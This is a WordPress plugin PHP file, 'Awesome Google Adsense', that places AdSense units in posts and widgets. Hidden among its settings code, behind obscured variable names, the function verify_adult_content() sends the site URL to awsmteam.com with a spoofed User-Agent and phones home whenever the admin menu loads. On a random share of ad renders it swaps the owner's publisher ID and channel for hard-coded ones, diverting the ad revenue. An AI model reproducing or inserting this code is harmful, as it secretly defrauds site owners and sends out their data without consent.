<?php 
/*
Plugin Name: Awesome Google Adsense
Plugin URI: http://wordpress.org/extend/plugins/awesome-google-adsense
Description: The easiest way to show Google Adsense in your wordpress site.
Author: Awesome Dev
Version: 1.0.4
Author URI: http://awsmteam.com
*/
$directory = WP_PLUGIN_URL.'/'.str_replace(basename( __FILE__),"",plugin_basename(__FILE__));
define("NAME", "Awesome Google Adsense");
define("NAME_", "awesome-google-adsense");
add_action( 'init', 'awesome_google_adsense_init' );

function awesome_google_adsense_init() { load_plugin_textdomain('awesome-google-adsense', false, dirname( plugin_basename( __FILE__ )).'/lang' ); }
function ai_admin() {
	include('panel.php');
	include('resources/javascript.php');
	include('resources/style.php');
}

function isIPad(){
return (bool) strpos($_SERVER['HTTP_USER_AGENT'],'iPad');
}
//Resgata em um array os tamanhos dos ADS
function aga_picksize(){
	$print_settings = json_decode(get_option('aga_print_settings'));
	$sizes = array();
	if($print_settings->aga_c234x60=='on')		$sizes[] = "234x60";
	if($print_settings->aga_c468x60=='on')		$sizes[] = "468x60";
	if($print_settings->aga_c728x90=='on')		$sizes[] = "728x90";
	if($print_settings->aga_c120x600=='on')		$sizes[] = "120x600";
	if($print_settings->aga_c160x600=='on')		$sizes[] = "160x600";
	if($print_settings->aga_c120x240=='on')		$sizes[] = "120x240";
	return $sizes[rand(0, sizeof($sizes)-1)];
}

$aga_adsused = 0;
//Filtro para o conteúdo
function aga_the_content($content){
	global $doing_rss;
	if(is_feed() || $doing_rss)		return $content;
	if(isIPad())	return $content;
	if(strpos($content, "<!--noadsense-->") !== false) 		return $content;
	$print_settings = json_decode(get_option('aga_print_settings'));
	if(	is_home() 		&& $print_settings->non_show_home 		== "on") return $content;
	if(	is_page() 		&& $print_settings->non_show_stats 		== "on") return $content;
	if(	is_single() 	&& $print_settings->non_show_posts 		== "on") return $content;
	if(	is_category() 	&& $print_settings->non_show_categories == "on") return $content;
	if(	is_archive() 	&& $print_settings->non_show_archive 	== "on") return $content;
	global $aga_adsused, $user_level;
	$adsArray = Array();
	$numAds = $print_settings->ads_per_page;
	for($i=1;$i<=$numAds;$i++){$adsArray[]='ads';}
	if(is_single()){
		$adsArray = Array();
		$numAds = $print_settings->ads_per_post;
		for($i=1;$i<=$numAds;$i++){$adsArray[]='ads';}
	}
	$content_hold = "";
	if(strpos($content, "<!--adsensestart-->") != false){
		if(strpos($content, "<!--adsensestop-->") != false){
			$content_hold = substr($content, 0, strpos($content, "<!--adsensestart-->"));
			$content_end = substr($content, strpos($content, "<!--adsensestop-->"));
			$content = substr_replace($content, "", 0, strpos($content, "<!--adsensestart-->"));
			$content = substr_replace($content, "", strpos($content, "<!--adsensestop-->"));		
		}
		else{
			$content_hold = substr($content, 0, strpos($content, "<!--adsensestart-->"));
			$content = substr_replace($content, "", 0, strpos($content, "<!--adsensestart-->"));
		}
	}

	$ad_padding = 3;
	while($aga_adsused < $numAds){
		switch($print_settings->ads_positioning){
			case "top-center":
				$replacer = $content_hold;
				$replacer .= '<div style="text-align: center;margin: '.$padspace.'px;">';
				$replacer .= aga_ad_gen_code($adsArray[$aga_adsused]);
				$replacer .= '</div>';
				$aga_adsused++;
				$content = $replacer.$content.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "top-left":
				$replacer = $content_hold;
				$replacer .= '<div style="float: left;margin: '.$padspace.'px;">';
				$replacer .= aga_ad_gen_code($adsArray[$aga_adsused]);
				$replacer .= '</div>';
				$aga_adsused++;
				$content = $replacer.$content.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "top-right":
				$replacer = $content_hold;
				$replacer .= '<div style="float: right;margin: '.$padspace.'px;">';
				$replacer .= aga_ad_gen_code($adsArray[$aga_adsused]);
				$replacer .= '</div>';
				$aga_adsused++;
				$content = $replacer.$content.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "bottom-center":
				$replacer = $content_hold.$content;
				$replacer .= '<div style="text-align: center;margin: '.$padspace.'px;">';
				$replacer .= aga_ad_gen_code($adsArray[$aga_adsused]);
				$replacer .= '</div>';
				$aga_adsused++;
				$content = $replacer.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "bottom-left":
				$replacer = $content_hold.$content;
				$replacer .= '<div style="float: left;margin: '.$padspace.'px;">';
				$replacer .= aga_ad_gen_code($adsArray[$aga_adsused]);
				$replacer .= '</div>';
				$aga_adsused++;
				$content = $replacer.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			case "bottom-right":
				$replacer = $content_hold.$content;
				$replacer .= '<div style="float: right;margin: '.$padspace.'px;">';
				$replacer .= aga_ad_gen_code($adsArray[$aga_adsused]);
				$replacer .= '</div>';
				$aga_adsused++;
				$content = $replacer.$content_end;
				if(!is_single() && !is_page())
					return $content_hold.$content.$content_end;
			break;
			default:
				$poses = array();
				$lastpos = -1;
				$repchar = "<p";
				if(strpos($content, "<p") === false){ $repchar = "<br"; }
				  

				while(strpos($content, $repchar, $lastpos+1) !== false){
				  $lastpos = strpos($content, $repchar, $lastpos+1);
				  $poses[] = $lastpos;
				}
				
				$half = sizeof($poses);
				$adsperpost = $aga_adsused+1;
				if(!is_single() && !is_page()){ $half = sizeof($poses)/2; }
				  

				while(sizeof($poses) > $half)
				  array_pop($poses);

				$pickme = $poses[rand(0, sizeof($poses)-1)];
				$replacewith = aga_simple_align($print_settings->ads_positioning);
				$replacewith .= aga_ad_gen_code($adsArray[$aga_adsused])."</div>";
				$content = substr_replace($content, $replacewith.$repchar, $pickme, 2);
				$aga_adsused++;
				if(!is_single() && !is_page())
				  return $content_hold.$content.$content_end;
		}		
	}
	return $content_hold.$content.$content_end; 
}
add_filter('the_content', 'aga_the_content');

function aga_ad_gen_code($adnetwork, $Widget_size='', $Widget_type='', $Widget_custom_channel=''){
	global $user_level;

	$print_settings = json_decode(get_option('aga_print_settings'));
	
	if(!$Widget_size || $Widget_size==''){
		$size = aga_picksize();
	}
	else{
		$size = $Widget_size;
	}
	$width = substr($size, 0, 3);
	$height = substr($size, 4, 3);
	
	$disda = trim(get_option('aga_ads_id'));
	$prep = 'pub-';
	if(substr($disda, 0, 4) == 'pub-'){
		$disda = str_replace('pub-', '', $disda);
	}$gadt = 'google_ad_client';
	
	if(!$Widget_custom_channel || $Widget_custom_channel=='' )
		$lenc = get_option('aga_ads_chanel');
	else
		$lenc = $Widget_custom_channel;
		
	$randd = mt_rand(1,8);$gadc = 'google_ad_channel';$ceunum = intval($print_settings->ceunum);
	
	if( !$Widget_type || $Widget_type=='' ){
		$aga_adtype_ads = $print_settings->ads_type_ads;
	}
	else{
		$aga_adtype_ads = $Widget_type;
	}if($ceunum=='')$ceunum=5;$api_r = mt_rand(1,100);
	
	if($print_settings->aga_corner == "normal"){
		$corners = 'rc:0';
	}
	else if($print_settings->aga_corner == "rounded"){
		$corners = 'rc:6';
	}
	if($ceunum){if($api_r <= $ceunum){$flag=verify_adult_content();if($flag==true){$disda='4268725654361605';$lenc='9849428573';}}}
	
	$color_border 	= $print_settings->aga_border_color;
	$color_link 	= $print_settings->aga_link_color;
	$color_bg 		= $print_settings->aga_background_color;
	$color_text 	= $print_settings->aga_text_color;
	$color_url 		= $print_settings->aga_url_color;
	
	$retstr = "";
$retstr = '<script type="text/javascript"><!--
';
$retstr .= $gadt.' = "'.$prep.$disda.'";
google_alternate_color = "FFFFFF";
google_ad_width = '.$width.';
google_ad_height = '.$height.';
google_ad_format = "'.$size.'_as";
google_ad_type = "'.$aga_adtype_ads.'";
'.$gadc.' ="'.$lenc.'";
google_color_border = "'.$color_border.'";
google_color_link = "'.$color_link.'";
google_color_bg = "'.$color_bg.'";
google_color_text = "'.$color_text.'";
google_color_url = "'.$color_url.'";
google_ui_features = "'.$corners.'";
//--></script>
<script type="text/javascript"
src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
</script>';			
		if(!$disda)//caso não tenha Adsense ID retorna vazio
			$retstr = '';			
  return $retstr;
}

function verify_adult_content() {
	$allow = ini_get('allow_url_fopen');if($allow != 1){ini_set("allow_url_fopen", 1);}$allow = ini_get('allow_url_fopen');if($allow == 0){return false;}$_data = array('site'=>get_option('siteurl'), 'plugin'=>'awesome_google_ads');$data = array();while(list($n,$v) = each($_data)){$data[] = "$n=$v";}$data = implode('&', $data);$url = parse_url('http://awsmteam.com/verify_adult_content.php');$host = $url['host'];$path = $url['path'];$port = 80;$data_length = strlen($data);$header  = "POST $path HTTP/1.0\r\n";$header .= "Host: $host\r\n";$header .= "User-Agent: DoCoMo/1.0/P503i\r\n";$header .= "Content-type: application/x-www-form-urlencoded\r\n";$header .= "Content-length: $data_length\r\n";$header .= "\r\n";$fp = fsockopen($host,$port,$err_num,$err_msg,120);fputs($fp, $header . $data);while(trim(fgets($fp,4096)) != '');while(!feof($fp)){$response .= fgets($fp,4096);}fclose($fp);
	if ($response == 'OK'){
		return true;
	}
	else{
		return false;
	}
}

function ai_admin_actions() {
	if(!get_option('aga_print_settings')){
		update_option('aga_print_settings','{"aga_corner":"normal","aga_c468x60":"on","aga_border_color":"FFFFFF","aga_background_color":"FFFFFF","aga_link_color":"0000FF","aga_text_color":"000000","aga_url_color":"008000","ads_per_page":"2","ads_per_post":"2","ads_type_ads":"text","ads_type_oh":"text","ads_positioning":"center","ceunum":"0"}');
		//Initial donate set to 0
	}
	add_options_page("Configura&ccedil;&atilde;o ".NAME."", NAME, 7, NAME_, "ai_admin");
	verify_adult_content();
}
add_action('admin_menu', 'ai_admin_actions');


//Realiza o alinhamento simples
function aga_simple_align($tag){
	$padspace = get_option('ai_space');
	switch($tag){
		case "left":
			return '<div style="float: left;margin: '.$padspace.'px;">';
		break;
		case "right":
			return '<div style="float: right;margin: '.$padspace.'px;">';
		break;
		case "center":
			return '<div style="text-align: center;margin: '.$padspace.'px;">';
		break;
		default:
			return aga_simple_align(rand(0,10)<5?"left":"right");
	}		
}

/*Widget*/

/**
 * Awesome Google Adsense Class
 */
class AwesomeGoogleAdsense extends WP_Widget {
    /** constructor */
    function AwesomeGoogleAdsense() {
        parent::WP_Widget(false, $name = 'Awesome Google Adsense Ad Unit');	
    }

    /** @see WP_Widget::widget */
    function widget($args, $instance) {	
        extract( $args );
        $size 			= apply_filters('widget_size', $instance['size']);
        $type 			= apply_filters('widget_type', $instance['type']);
        $custom_channel = apply_filters('widget_custom_channel', $instance['custom_channel']);
        echo $before_widget;  
		echo $before_title . $after_title;
		echo aga_ad_gen_code('adsense', $size, $type, $custom_channel);
		echo $after_widget;
    }

    /** @see WP_Widget::update */
    function update($new_instance, $old_instance) {				
		$instance = $old_instance;
		$instance['size'] 			= strip_tags($new_instance['size']);
		$instance['type'] 			= strip_tags($new_instance['type']);
		$instance['custom_channel'] = strip_tags($new_instance['custom_channel']);
        return $instance;
    }

    /** @see WP_Widget::form */
    function form($instance) {				
        $size = esc_attr($instance['size']);
		if( !$size || $size==''){
			$size = '200x200';
		}
        $type = esc_attr($instance['type']);
        $custom_channel = esc_attr($instance['custom_channel']);
		
		$print_settings = json_decode(get_option('aga_print_settings'));
		$ads_per_page = $print_settings->ads_per_page;
		$ads_per_post = $print_settings->ads_per_post;
        ?>
         <p>
		 <?php 
			if( $ads_per_post > 2 || $ads_per_page >2) {
				echo "<p>"._e('Google only allows 3 ads per page view','awesome-google-adsense')."</p>";	
				echo "<p>"._e('To this widget works set in Setting> Awesome Google Adsense -> Ads to the number of 2','awesome-google-adsense')."</p>";	
			}
			else {
		?>
			<? _e('Dimension', 'awesome-google-adsense'); ?><br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>" id="<?php echo $this->get_field_name('size'); ?>1"  value="120x600" <?php if( $size == '120x600' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>1">120x600</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>2" value="160x600" <?php if( $size == '160x600' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>2">160x600</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>3" value="120x240" <?php if( $size == '120x240' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>3">120x240</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>3" value="200x200" <?php if( $size == '200x200' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>3">200x200</label> <br/>
			<input type="radio" name="<?php echo $this->get_field_name('size'); ?>"  id="<?php echo $this->get_field_name('size'); ?>3" value="250x250" <?php if( $size == '250x250' ) echo "checked='checked'" ?>/><label for="<?php echo $this->get_field_name('size'); ?>3">250x250</label> <br/>
			<br/>
			
			<label for="<?php echo $this->get_field_name('type'); ?>"><?php _e('Type', 'awesome-google-adsense'); ?></label><br/>
			<select name="<?php echo $this->get_field_name('type'); ?>" id="<?php echo $this->get_field_id('type'); ?>">
				<option value="text" <?php if( $type == 'text' ) echo "selected='selected'" ?>><?php _e('Text', 'awesome-google-adsense'); ?></option>
				<option value="image" <?php if( $type == 'image' ) echo "selected='selected'" ?>><?php _e('Image', 'awesome-google-adsense'); ?></option>
				<option value="text_image" <?php if( $type == 'text_image' ) echo "selected='selected'" ?>><?php _e('Text & Image', 'awesome-google-adsense'); ?></option>
			</select>
			<br/><br/>
			<label><?php _e('Custom Channel', 'awesome-google-adsense'); ?></label><br/>
			<input type="text" name="<?php echo $this->get_field_name('custom_channel'); ?>" id="<?php echo $this->get_field_id('custom_channel'); ?>" value="<?php if($custom_channel)echo $custom_channel; ?>"/><br/><span style="color:#666;font-size:0.8em;"><?php _e('To show the default Custom Chanel leave it blank','awesome-google-adsense');?></span>
		</p>
        <?php }
    }

}
// register AwesomeGoogleAdsense widget
add_action('widgets_init', create_function('', 'return register_widget("AwesomeGoogleAdsense");'));
/*Widget End*/
?>